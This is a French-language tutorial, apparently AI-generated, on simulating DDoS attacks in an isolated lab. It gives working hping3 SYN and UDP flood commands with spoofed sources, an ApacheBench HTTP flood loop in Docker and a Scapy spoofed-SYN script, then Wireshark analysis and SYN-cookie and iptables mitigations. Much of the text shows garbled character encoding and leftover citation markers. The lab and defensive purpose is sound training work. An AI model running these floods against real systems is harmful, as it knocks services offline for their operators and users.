# Tutoriel : Simuler un DDoS en environnement sÃ©curisÃ©

## ğŸ¯ Objectif  
Reproduire diffÃ©rents types d'attaques DDoS (SYNâ€‘flood, UDP/HTTP flood) dans un lab isolÃ©, analyser leur impact, et comprendre les contre-mesures.

## ğŸ§  ScÃ©nario Ã©motionnel  
Vous gÃ©rez un service web et craignez un assaut automatisÃ©. Vous devez tester votre infrastructure en environnement contrÃ´lÃ© pour anticiper et mitiger avant un vrai incident.

---

## ğŸ› ï¸ PrÃ©requis  
- Deux VM ou conteneurs Docker sur un rÃ©seau isolÃ© (attacker + cible + sniff)  
- SystÃ¨me : Kali Linux (attacker) + Ubuntu/Nginx (victime)  
- Outils : `hping3`, `ab` (ApacheBench), `Wireshark`, `Scapy` ou Python  
- RÃ©seau non accessible depuis Internet

---

## ğŸ§© Ã‰tapeâ€¯1 â€“ PrÃ©parer lâ€™environnement

1. VM Attacker : Kali avec `sudo apt install hping3 apache2-utils`  
2. VM Cible : Ubuntu avec serveur `sudo apt install nginx`  
3. Sniffer : Wireshark ou `tcpdump -i eth0 -w ddos.pcap`

---

## ğŸ§© Ã‰tapeâ€¯2 â€“ Attaque SYN-flood avec hping3

```bash
sudo hping3 -S --flood --rand-source -p 80 <IP_CIBLE>

	â€¢	-S : SYN-flood ; --flood : envoi continu ; --rand-source : fausse IP
Analysez avec htop, logs /var/log/nginx/access.log ou Wireshark  ï¿¼ ï¿¼ ï¿¼

â¸»

ğŸ§© Ã‰tapeâ€¯3 â€“ Attaque UDP flood

sudo hping3 --udp --flood -p 80 <IP_CIBLE>

Simule une saturation UDP, Ã  regarder via netstat -s pour erreurs ou surcharge

â¸»

ğŸ§© Ã‰tapeâ€¯4 â€“ Attaque HTTP flood simulÃ©e

CrÃ©ez un conteneur Docker :

FROM alpine
RUN apk add apache2-utils
COPY attack.sh /attack.sh
CMD ["sh","/attack.sh"]

attack.sh :

#!/bin/sh
while true; do
  ab -n 1000 -c 50 http://<IP_CIBLE>/;
  sleep 1;
done

ab envoie des requÃªtes HTTP intensÃ©ment â†’ simulateur HTTP flood  ï¿¼

â¸»

ğŸ” Ã‰tapeâ€¯5 â€“ Capture & analyse avec Wireshark
	â€¢	Filtre tcp.flags.syn==1 pour SYN floods
	â€¢	VOIX UDP ou HTTP, latence, erreurs 503
	â€¢	Volume et rafale des paquets ï¿¼

â¸»

ğŸ›¡ï¸ Ã‰tapeâ€¯6 â€“ Mitigation et dÃ©fenses

Dans un shell cible :

# Activer SYN cookies
sudo sysctl -w net.ipv4.tcp_syncookies=1

# Limiter la taille des queues
sudo sysctl -w net.ipv4.tcp_max_syn_backlog=128

# Rate limiting via iptables
sudo iptables -A INPUT -p tcp --syn -m limit --limit 10/s --limit-burst 20 -j ACCEPT

Testez Ã  nouveau les attaques pour observer lâ€™amÃ©lioration.

â¸»

ğŸ§  Ã‰tapeâ€¯7 â€“ Simulation dâ€™un botnet Scapy (optionnel)

from scapy.all import send, IP, TCP
import random

for _ in range(10000):
    src = ".".join(str(random.randint(1,254)) for _ in range(4))
    pkt = IP(src=src, dst="<IP_CIBLE>")/TCP(dport=80, flags="S")
    send(pkt, verbose=False)

Ã‰mule un botnet simple sans surcharge, intÃ©ressant pour analyse comportementale  ï¿¼ ï¿¼

â¸»

ğŸ§ª Quiz de consolidation
	1.	Quel flag TCP dÃ©clenche le flood SYNâ€¯?
	2.	Pourquoi utiliser --rand-sourceâ€¯?
	3.	Quels indicateurs de mitigation via sysctl surveiller ?
	4.	Comment reconnaÃ®tre un HTTP flood dans les logs ?
	5.	Quel est le risque principal dâ€™un test DDoS hors labâ€¯?

â¸»

âœ… Cas dâ€™usage
	â€¢	Test de robustesse pour serveurs web afin dâ€™Ã©viter indisponibilitÃ©
	â€¢	Validation de rÃ¨gles iptables, SYN cookies, rate-limiting
	â€¢	Formation SOC : dÃ©tection & rÃ©ponse Ã  une attaque DDoS en live

â¸»

ğŸ”§ Extensions possibles
	â€¢	CrÃ©er un botnet rÃ©parti via plusieurs conteneurs Docker
	â€¢	Utiliser des scÃ©narios red team avec outils comme LOIC/HULK  ï¿¼ ï¿¼ ï¿¼ ï¿¼ ï¿¼ ï¿¼
	â€¢	Automatiser la simulation + collecte via scripts + alertes Slack
	â€¢	Build un prototype de dÃ©tection DDoS avec machine learning (ex. sur entropie/flot) ()

â¸»

ğŸ“ RÃ©sultat attendu
	â€¢	Attaques SYN, UDP et HTTP simulÃ©es dans un environnement contrÃ´lÃ©
	â€¢	Analyse et rapport des effets sur la cible (CPU, latence, logs)
	â€¢	ImplÃ©mentation efficace des contre-mesures rÃ©seau
	â€¢	Base solide pour Ã©laborer un vÃ©ritable IDS/IPS anti-DDoS

---

### ğŸ“š Sources principales  
- DDoS via hping3 (SYN/UDP floods)  [oai_citation:13â€¡GitHub](https://github.com/Indrajith-S/CEH-Lab-Notes/blob/master/9.%20Denial%20of%20Service/Perform%20a%20DoS%20Attack%20on%20a%20Target%20Host%20using%20hping3.md?utm_source=chatgpt.com)  
- HTTP flood via ApacheBench dans Docker  [oai_citation:14â€¡blogs.chiragganguli.com](https://blogs.chiragganguli.com/content/DDoS-Attack-Simulation-using-Docker?utm_source=chatgpt.com)  
- Guide Keysight pour simulation DDoS en labo  [oai_citation:15â€¡Keysight](https://www.keysight.com/us/en/assets/7019-0414/technical-overviews-archived/Simulating-a-DDoS-Attack-in-Your-Own-Lab.pdf?utm_source=chatgpt.com)  
- Botnet simulÃ© en Python/Scapy  [oai_citation:16â€¡GitHub](https://github.com/eniac1546/Simple-DDOS-attack-Implementation?utm_source=chatgpt.com)

